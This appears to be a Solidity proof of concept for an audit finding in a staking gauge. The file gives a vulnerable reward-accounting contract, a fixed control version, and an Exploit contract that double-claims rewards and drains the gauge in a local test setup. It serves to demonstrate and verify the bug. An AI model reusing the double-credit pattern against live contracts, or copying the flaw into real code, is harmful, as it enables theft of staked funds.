// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — C-04 (Pashov, 2025-05-06), BaseGauge.updateUserRewards.
    The helper credits pending rewards but never advances userData.integral.
    claimRewards then runs _updateUserReward on the same gap and credits the
    reward a second time. One stake of 1000 tokens pays 2000. The control
    writes integral and pays 1000.
*/

contract Token {
    string public symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BaseGauge {
    struct RewardData {
        uint256 rewardPerTokenStored;
    }

    struct UserRewardData {
        uint256 integral;
        uint256 lastUpdate;
    }

    Token public rewardToken;
    address[] public rewardTokens;
    mapping(address => RewardData) public rewardData;
    mapping(address => mapping(address => UserRewardData)) public userRewardData;
    mapping(address => mapping(address => uint256)) public rewards;
    mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;
    mapping(address => uint256) internal _balances;
    bool public boostAmplificationEnabled;
    uint256 public constant WEIGHT_PRECISION = 1e18;

    constructor(Token token) {
        rewardToken = token;
        rewardTokens.push(address(token));
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function integralOf(address account) external view returns (uint256) {
        return userRewardData[address(rewardToken)][account].integral;
    }

    function stake(address account, uint256 amount) external {
        _balances[account] += amount;
    }

    function seed(address account, uint256 rewardPerToken) external {
        rewardData[address(rewardToken)].rewardPerTokenStored = rewardPerToken;
        userRewardData[address(rewardToken)][account].integral = 0;
    }

    function _calculatePendingRewards(address token, address account) internal view returns (uint256) {
        uint256 userBalance = _balances[account];
        if (userBalance == 0) return 0;
        uint256 delta = rewardData[token].rewardPerTokenStored - userRewardData[token][account].integral;
        return (userBalance * delta) / 1e18;
    }

    function updateUserRewards() external {
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            address token = rewardTokens[i];
            RewardData storage rd = rewardData[token];
            uint256 pending = _calculatePendingRewards(token, msg.sender);
            if (pending > 0) {
                // @> VULN: credits the full pending amount and never writes userData.integral, so the same gap is paid again on claim
                rewards[token][msg.sender] += pending;
                userRewardData[token][msg.sender].lastUpdate = block.timestamp;
                userRewardPerTokenPaid[token][msg.sender] = rd.rewardPerTokenStored;
            }
        }
    }

    function _updateUserReward(address token, address account, uint256 rewardPerToken, uint256 decimalAdjustment)
        internal
    {
        UserRewardData storage userData = userRewardData[token][account];
        uint256 userBalance = _balances[account];
        if (userBalance > 0) {
            uint256 userIntegralDelta = rewardPerToken - userData.integral;
            if (userIntegralDelta > 0) {
                uint256 workingBalance = userBalance;
                if (boostAmplificationEnabled) {
                    uint256 boost = WEIGHT_PRECISION;
                    workingBalance = (workingBalance * boost) / WEIGHT_PRECISION;
                }
                uint256 newReward = (workingBalance * userIntegralDelta) / (1e18 * decimalAdjustment);
                userData.integral = rewardPerToken;
                userData.lastUpdate = block.timestamp;
                rewards[token][account] += newReward;
            }
        }
    }

    function claimRewards() external {
        address token = address(rewardToken);
        _updateUserReward(token, msg.sender, rewardData[token].rewardPerTokenStored, 1);
        uint256 amt = rewards[token][msg.sender];
        rewards[token][msg.sender] = 0;
        require(rewardToken.transfer(msg.sender, amt), "pay");
    }
}

contract BaseGaugeFixed {
    struct RewardData {
        uint256 rewardPerTokenStored;
    }

    struct UserRewardData {
        uint256 integral;
        uint256 lastUpdate;
    }

    Token public rewardToken;
    mapping(address => RewardData) public rewardData;
    mapping(address => mapping(address => UserRewardData)) public userRewardData;
    mapping(address => mapping(address => uint256)) public rewards;
    mapping(address => uint256) internal _balances;

    constructor(Token token) {
        rewardToken = token;
    }

    function stake(address account, uint256 amount) external {
        _balances[account] += amount;
    }

    function seed(address account, uint256 rewardPerToken) external {
        rewardData[address(rewardToken)].rewardPerTokenStored = rewardPerToken;
    }

    function updateUserRewards() external {
        address token = address(rewardToken);
        uint256 rewardPerToken = rewardData[token].rewardPerTokenStored;
        uint256 delta = rewardPerToken - userRewardData[token][msg.sender].integral;
        uint256 pending = (_balances[msg.sender] * delta) / 1e18;
        rewards[token][msg.sender] += pending;
        userRewardData[token][msg.sender].lastUpdate = block.timestamp;
        userRewardData[token][msg.sender].integral = rewardPerToken;
    }

    function claimRewards() external {
        address token = address(rewardToken);
        uint256 rewardPerToken = rewardData[token].rewardPerTokenStored;
        uint256 delta = rewardPerToken - userRewardData[token][msg.sender].integral;
        if (delta > 0 && _balances[msg.sender] > 0) {
            rewards[token][msg.sender] += (_balances[msg.sender] * delta) / 1e18;
            userRewardData[token][msg.sender].integral = rewardPerToken;
        }
        uint256 amt = rewards[token][msg.sender];
        rewards[token][msg.sender] = 0;
        require(rewardToken.transfer(msg.sender, amt), "pay");
    }
}

contract Exploit {
    uint256 public constant STAKE = 1000 ether;
    uint256 public constant FAIR = 1000 ether;

    Token public token;
    BaseGauge public gauge;
    uint256 public received;

    constructor() {
        token = new Token();
        gauge = new BaseGauge(token);
        gauge.stake(address(this), STAKE);
        gauge.seed(address(this), 1e18);
        token.mint(address(gauge), FAIR * 2);
    }

    function run() external {
        uint256 beforeBal = token.balanceOf(address(this));
        gauge.updateUserRewards();
        uint256 bookedOnce = gauge.rewards(address(token), address(this));
        gauge.claimRewards();
        received = token.balanceOf(address(this)) - beforeBal;
        require(bookedOnce == FAIR, "once");
        require(received == FAIR * 2, "double");
        require(token.balanceOf(address(gauge)) == 0, "drained");
        require(gauge.integralOf(address(this)) == 1e18, "integral late");
    }
}
